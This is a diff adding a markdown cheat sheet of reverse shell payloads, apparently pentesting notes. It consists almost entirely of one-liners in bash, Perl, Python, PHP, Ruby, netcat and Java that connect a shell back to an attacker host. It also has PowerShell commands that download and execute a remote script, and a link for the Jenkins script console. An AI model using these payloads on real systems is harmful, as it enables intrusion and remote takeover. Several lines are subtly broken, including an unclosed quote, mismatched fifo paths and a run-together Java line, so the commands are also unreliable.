@@ -1,0 +1,79 @@
+# Reverse shell
+
+### Powershell
+
+```c
+// Edit and host nishang Invoke-PowershellTcp
+Powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.32/shell.ps1)
+
+// using powershell.exe os bit architecture
+C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.32/shell.ps1)
+
+```
+
+### Bash/Shell
+
+```bash
+# bash
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+
+# /bin/bash
+/bin/bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+
+# sh
+sh -i >& /dev/tcp/10.0.0.1/8080 0>&1
+```
+
+### Perl
+
+```bash
+perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' 
+```
+
+### Python
+
+```bash
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+
+### PHP
+
+```bash
+# This code assumes that the TCP connection uses file descriptor 3.  If doesn’t work, try 4, 5, 6…
+php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+
+### Ruby
+
+```bash
+ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+```
+
+### Netcat / Netcat without -e
+
+```bash
+# sh
+nc -e /bin/sh 10.0.0.1 1234
+
+# bash
+nc -e /bin/bash 10.0.0.1 1234
+
+#Netcat without -e
+rm /tmp/2;mkfifo /tmp/2;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/2
+
+#Netcat without -e (FREEBSD ONLY!)
+rm /tmp/2;mkfifo /tmp/2;cat /tmp/f|/bin/sh -i |nc 10.0.0.1 1234 >/tmp/2
+```
+
+### Java
+
+```bash
+r = Runtime.getRuntime()p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])p.waitFor()
+```
+
+### JENKINS Script Console
+
+Jenkins &gt; Manage Jenkins &gt; script console
+
+{% embed url="https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76" %}
+
